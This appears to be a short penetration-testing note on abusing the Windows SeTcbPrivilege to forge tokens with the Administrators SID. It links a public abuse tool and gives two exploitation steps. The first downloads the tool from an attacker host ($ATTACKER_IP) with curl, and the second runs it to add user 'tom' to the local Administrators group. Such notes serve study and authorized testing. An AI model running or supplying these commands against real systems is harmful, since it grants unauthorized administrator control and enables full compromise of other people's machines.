
`"TCB" = **Trusted Computing Base**`

**What SeTcbPrivilege actually gives you**

Normally, Windows builds your token itself and only writes in the groups you genuinely belong to — you can't edit your own card.

SeTcbPrivilege ("Act as part of the operating system") changes that. It tells Windows you _are_ part of the OS core (LSA-level trust). This lets you **create your own tokens** and write whatever groups you want into them — including the **Administrators SID**.

So you mint a brand-new token that says "tom — member of: Users **and Administrators**," and Windows trusts it, because minting tokens is exactly what this privilege authorizes.

**Why it's dangerous:** it's one of the most powerful Windows privileges. A holder can create tokens, impersonate any user, and inject arbitrary group SIDs — effectively a full system compromise.

**Tool :** [https://github.com/b4lisong/SeTcbPrivilege-Abuse](https://github.com/b4lisong/SeTcbPrivilege-Abuse)

**Exploitation steps**

1. **Upload the tool** to the target:

```powershell
   curl http://$ATTACKER_IP:8000/TcbElevation-x64.exe -o TcbElevation-x64.exe
```

2. **Run a command inside a forged admin token:**

```powershell
   .\TcbElevation-x64.exe elevate "net localgroup Administrators tom /add"
```

